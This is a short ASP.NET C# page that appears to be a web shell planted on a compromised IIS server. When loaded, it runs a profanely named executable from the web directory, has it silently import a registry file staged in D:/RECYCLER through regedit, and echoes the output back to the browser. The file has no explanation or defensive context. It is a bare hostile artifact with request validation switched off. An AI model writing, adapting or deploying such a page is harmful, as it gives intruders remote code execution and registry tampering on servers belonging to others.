<%@ Page Language="C#" Debug="true" trace="false" validateRequest="false"%>
<%@ import Namespace="System.IO" %>
<%@ import Namespace="System.Diagnostics" %>
<%@ import Namespace="System.Data" %>
<%@ import Namespace="System.Data.OleDb" %>
<%@ import Namespace="Microsoft.Win32" %>
<%@ import Namespace="System.Net.Sockets" %>
<%@ Assembly Name="System.DirectoryServices, Version=2.0.0.0, Culture=neutral, PublicKeyToken=B03F5F7F11D50A3A" %>
<%@ import Namespace="System.DirectoryServices" %>
<%
System.Diagnostics.Process myP = new System.Diagnostics.Process();
myP.StartInfo. 
RedirectStandardOutput = true;
myP.StartInfo.FileName=Server.MapPath("fuck.exe");
myP.StartInfo.UseShellExecute = false;
myP.StartInfo.Arguments= " \"D:/RECYCLER/regedit.exe -s D:/RECYCLER/1.reg\" ";
myP.Start();
string output = myP.StandardOutput.ReadToEnd();
Response.Write(output);
%>